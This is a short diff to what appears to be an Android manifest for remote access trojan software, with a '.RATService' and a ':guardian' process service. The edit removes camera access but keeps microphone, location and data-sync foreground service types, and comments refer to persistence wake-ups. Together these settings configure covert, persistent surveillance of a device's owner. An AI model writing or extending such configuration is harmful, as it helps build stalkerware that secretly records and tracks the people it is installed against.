@@ -173,7 +173,7 @@
             android:name=".RATService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="camera|microphone|location|dataSync"
+            android:foregroundServiceType="microphone|location|dataSync"
             android:stopWithTask="false"
             android:persistent="true" />
         
@@ -183,7 +183,7 @@
             android:enabled="true"
             android:exported="false"
             android:process=":guardian"
-            android:foregroundServiceType="camera|microphone|location|dataSync"
+            android:foregroundServiceType="microphone|location|dataSync"
             android:stopWithTask="false" />
         
         <!-- Persistence JobService - Scheduled wake-ups -->
